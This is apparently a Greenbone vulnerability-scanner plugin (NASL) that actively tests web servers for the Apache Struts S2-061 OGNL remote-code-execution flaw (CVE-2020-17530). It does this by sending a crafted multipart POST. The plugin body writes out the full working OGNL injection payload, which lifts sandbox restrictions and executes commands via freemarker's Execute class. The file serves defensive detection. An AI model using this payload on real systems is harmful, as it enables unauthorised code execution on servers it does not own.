# SPDX-FileCopyrightText: 2021 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.145808");
  script_version("2025-03-19T05:38:35+0000");
  script_tag(name:"last_modification", value:"2025-03-19 05:38:35 +0000 (Wed, 19 Mar 2025)");
  script_tag(name:"creation_date", value:"2021-04-22 04:27:06 +0000 (Thu, 22 Apr 2021)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-07-20 23:15:00 +0000 (Tue, 20 Jul 2021)");

  script_cve_id("CVE-2020-17530");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Apache Struts Security Update (S2-061) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2021 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "os_detection.nasl",
                      "gb_vmware_vcenter_server_http_detect.nasl",
                      "gb_microfocus_service_manager_http_detect.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("www/action_jsp_do");

  script_tag(name:"summary", value:"Apache Struts is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"Some of the tag's attributes could perform a double evaluation
  if a developer applied forced OGNL evaluation by using the %{...} syntax. Using forced OGNL
  evaluation on untrusted user input can lead to a remote code execution and security
  degradation.");

  script_tag(name:"affected", value:"Apache Struts 2.0.0 through 2.5.25.");

  script_tag(name:"solution", value:"Update to version 2.5.26 or later.");

  script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/S2-061");
  script_xref(name:"Advisory-ID", value:"S2-061");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 8080);
host = http_host_name(dont_add_port: TRUE);

urls = make_list();

foreach ext (make_list("action", "do", "jsp")) {
  exts = http_get_kb_file_extensions(port: port, host: host, ext: ext);
  if (exts && is_array(exts)) {
    urls = make_list(urls, exts);
  }
}

if (get_kb_item("vmware/vcenter/server/http/detected"))
  urls = make_list_unique("/statsreport/", urls);

x = 0;
cmds = exploit_commands();
vt_strings = get_vt_strings();
bound = '------------------------' + vt_strings["default"];
headers = make_array("Content-Type", "multipart/form-data; boundary=" + bound);

foreach url (urls) {

  x++;

  foreach pattern (keys(cmds)) {
    post_data = '--' + bound + '\r\n' +
                'Content-Disposition: form-data; name="id"\r\n\r\n' +
                '%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).' +
                '(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).' +
                '(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).' +
                '(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).' +
                '(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).' +
                '(#emptyset=#instancemanager.newInstance("java.util.HashSet")).' +
                '(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).' +
                '(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("' + cmds[pattern] +
                '")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).' +
                '(#execute.exec(#arglist))}\r\n' +
                '--' + bound + '--\r\n';

    req = http_post_put_req(port: port, url: url, data: post_data, add_headers: headers);
    res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

    if (egrep(pattern: pattern, string: res)) {
      info['HTTP Method'] = "POST";
      info['Affected URL'] = http_report_vuln_url(port: port, url: url, url_only: TRUE);
      info['HTTP "POST" body'] = post_data;
      info['HTTP "Content-Type" header'] = headers["Content-Type"];

      report  = 'By doing the following HTTP request:\n\n';
      report += text_format_table(array: info) + '\n\n';
      report += 'it was possible to execute the "' + cmds[pattern] + '" command on the target host.';
      report += '\n\nResult:\n\n' + res;
      expert_info = 'Request:\n\n' + req + '\n\nResponse:\n\n' + res;
      security_message(port: port, data: report, expert_info: expert_info);
      exit(0);
    }
  }

  if (x > 25) # nb: No need to continue, the system is very unlikely affected...
    break;
}

exit(0);
